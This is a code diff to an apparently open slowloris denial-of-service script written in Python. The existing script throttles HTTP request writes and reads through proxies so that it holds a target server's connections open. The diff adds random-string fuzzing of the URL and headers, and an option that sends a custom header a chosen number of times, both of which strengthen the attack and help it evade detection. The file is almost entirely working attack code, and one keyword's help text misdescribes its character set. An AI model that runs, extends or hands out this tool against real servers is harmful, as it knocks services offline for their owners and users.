@@ -5,6 +5,7 @@ import functools
 import random
 import re
 import ssl
+import string
 import time
 import urllib.parse
 
@@ -22,19 +23,54 @@ DEFAULT_HEADERS = {
     'Upgrade-Insecure-Requests': '1',
 }
 
-parser = argparse.ArgumentParser()
-parser.add_argument('url')
+parser = argparse.ArgumentParser(usage='url [OPTIONS...]')
+parser.add_argument('url', help='if a keyword is present in the url, it will be replaced with a string. more information is shown in the keywords section')
 parser.add_argument('--workers', type=int, default=8, help='(default: %(default)s)')
 parser.add_argument('--interval', type=float, default=1, metavar='SECONDS', help='interval between requests (default: %(default)s)')
 parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='connection timeout (default: %(default)s)')
 parser.add_argument('--read-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second (default: %(default)s)')
 parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second (default: %(default)s)')
 parser.add_argument('-H', '--header', action='append', default=[], help='add custom header')
+parser.add_argument('-Hn', '--header-n', action='append', default=[], help='send custom header N times. if a keyword is present in the header, it will be replaced with a string. more information is shown in the keywords section', nargs=2, metavar=('HEADER', 'N'))
 parser.add_argument('-X', '--request', default='GET', help='request method (default: %(default)s)')
 parser.add_argument('-d', '--data', action='append', default=[])
 parser.add_argument('-x', '--proxy', action='append', default=[], help="(example: socks5://...)")
-parser.add_argument('--proxy-file', metavar="FILE", help="load all line separated proxies from FILE")
+parser.add_argument('-xf', '--proxy-file', metavar="FILE", help="load all line separated proxies from FILE")
+
+FUZZ_KW = {}
+
+def randstr(seq, min, max=None):
+    if max is None:
+        return ''.join([random.choice(seq) for i in range(min)])
+    return ''.join([random.choice(seq) for i in range(random.randint(min, max))])
+
+def fuzz(s: str):
+    for k,f in FUZZ_KW.items():
+        s = str(re.sub(re.escape(k), f, s))
+    return s
+
+fuzz_kw_group = parser.add_argument_group('keywords')
+
+for min,max,suffix in [(16,32,''), (2,8,'-S'), (128,256,'-B')]:
+    kw = f'%RAND{suffix}%'
+    fuzz_kw_group.add_argument(kw, nargs='?', help=f'replaced by a random string of letters+numbers with length {min}-{max}')
+    FUZZ_KW[kw] = eval(f'lambda f: randstr(string.ascii_letters+string.digits, {min}, {max})')
+
+for min,max,suffix in [(16,32,''), (2,8,'-S'), (128,256,'-B')]:
+    kw = f'%RANDS{suffix}%'
+    fuzz_kw_group.add_argument(kw, nargs='?', help=f'replaced by a random string of letters with length {min}-{max}')
+    FUZZ_KW[kw] = eval(f'lambda f: randstr(string.ascii_letters+string.digits, {min}, {max})')
+
 args = parser.parse_args()
+
+for h,n in args.header_n:
+    try:
+        int(n)
+    except Exception as e:
+        print(f'Second argument of "-Hn \'{h}\' {n}" is not a number')
+        exit(1)
+
+args.header_n = [(h,int(n)) for h,n in args.header_n]
 
 args.proxy = set([p.strip() for p in args.proxy])
 
@@ -133,7 +169,7 @@ async def slowloris_attack_loop(*args, **kwargs):
             else:
                 print(f'{e.__class__.__name__}')
 
-async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxies, interval, request_method, data_list):
+async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxies, interval, request_method, data_list, headers_n_list):
     reader, writer = await slowloris_open(host, port, https, proxies)
     headers = DEFAULT_HEADERS
     headers['Host'] = host
@@ -157,10 +193,14 @@ async def slowloris_attack(host, port, read_rate, write_rate, https, path, heade
 
         time_write_start = time.time()
 
-        await slowloris_write(writer, f'{request_method} {path} HTTP/1.1\r\n', write_rate)
+        await slowloris_write(writer, f'{request_method} {fuzz(path)} HTTP/1.1\r\n', write_rate)
 
         for k,v in headers.items():
             await slowloris_write(writer, f'{k}: {v}\r\n', write_rate)
+
+        for h,n in headers_n_list:
+            for _ in range(n):
+                await slowloris_write(writer, f'{fuzz(h).strip()}\r\n', write_rate)
 
         await slowloris_write(writer, '\r\n', write_rate)
 
@@ -209,4 +249,5 @@ asyncio.run(run(
     interval=args.interval,
     request_method=args.request,
     data_list=args.data,
+    headers_n_list=args.header_n,
 ))
